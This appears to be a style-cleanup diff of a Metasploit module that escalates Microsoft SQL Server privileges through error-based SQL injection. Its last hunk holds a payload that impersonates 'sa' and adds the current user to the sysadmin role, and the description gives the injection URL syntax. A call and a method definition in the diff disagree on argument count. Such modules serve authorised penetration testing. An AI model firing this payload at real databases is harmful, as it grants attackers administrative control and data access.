@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,23 +8,21 @@ require 'msf/core'
 require 'msf/core/exploit/mssql_commands'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::MSSQL_SQLI
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Microsoft SQL Server SQLi Escalate Execute AS',
-      'Description'    => %q{
-        This module can be used escalate privileges if the IMPERSONATION privilege has been
-        assigned to the user via error based SQL injection.  In most cases, this results in
-        additional data access, but in some cases it can be used to gain sysadmin privileges.
-        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
-      },
-      'Author'         => ['nullbind <scott.sutherland[at]netspi.com>'],
-      'License'        => MSF_LICENSE,
-      'References'     => [['URL','http://msdn.microsoft.com/en-us/library/ms178640.aspx']]
-    ))
+                      'Name'           => 'Microsoft SQL Server SQLi Escalate Execute AS',
+                      'Description'    => %q(
+                        This module can be used escalate privileges if the IMPERSONATION privilege has been
+                        assigned to the user via error based SQL injection.  In most cases, this results in
+                        additional data access, but in some cases it can be used to gain sysadmin privileges.
+                        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
+                      ),
+                      'Author'         => ['nullbind <scott.sutherland[at]netspi.com>'],
+                      'License'        => MSF_LICENSE,
+                      'References'     => [['URL', 'http://msdn.microsoft.com/en-us/library/ms178640.aspx']]))
   end
 
   def run
@@ -75,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Attempt to escalate to sysadmin
     print_status("Attempting to impersonate #{imp_user_sysadmin}...")
-    escalate_privs(imp_user_sysadmin,db_user)
+    escalate_privs(imp_user_sysadmin, db_user)
 
     admin_status = check_sysadmin
     if admin_status && admin_status == '1'
@@ -95,11 +94,9 @@ class MetasploitModule < Msf::Auxiliary
     result = mssql_query(sql)
 
     # Parse result
-    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-      user_name = $1
-    else
-      user_name = nil
-    end
+    user_name = if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
+                  Regexp.last_match(1)
+                end
 
     user_name
   end
@@ -114,11 +111,9 @@ class MetasploitModule < Msf::Auxiliary
     result = mssql_query(sql)
 
     # Parse result
-    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-      status = $1
-    else
-      status = nil
-    end
+    status = if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
+               Regexp.last_match(1)
+             end
 
     status
   end
@@ -138,11 +133,9 @@ class MetasploitModule < Msf::Auxiliary
     # Run query
     res = mssql_query(sql)
 
-    unless res && res.body
-      return nil
-    end
+    return nil unless res && res.body
 
-    #Parse results
+    # Parse results
     parsed_result = res.body.scan(/#{clue_start}(.*?)#{clue_end}/m)
 
     if parsed_result && !parsed_result.empty?
@@ -165,11 +158,9 @@ class MetasploitModule < Msf::Auxiliary
       # Run query
       result = mssql_query(sql)
 
-      unless result && result.body
-        next
-      end
+      next unless result && result.body
 
-      #Parse results
+      # Parse results
       parsed_result = result.body.scan(/#{clue_start}(.*?)#{clue_end}/m)
 
       if parsed_result && !parsed_result.empty?
@@ -191,7 +182,6 @@ class MetasploitModule < Msf::Auxiliary
 
   # Attempt to escalate privileges
   def escalate_privs(db_user)
-
     # Setup Query - Impersonate the first sysadmin user on the list
     evil_sql = "1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '#{db_user}','sysadmin';Revert;--"
 
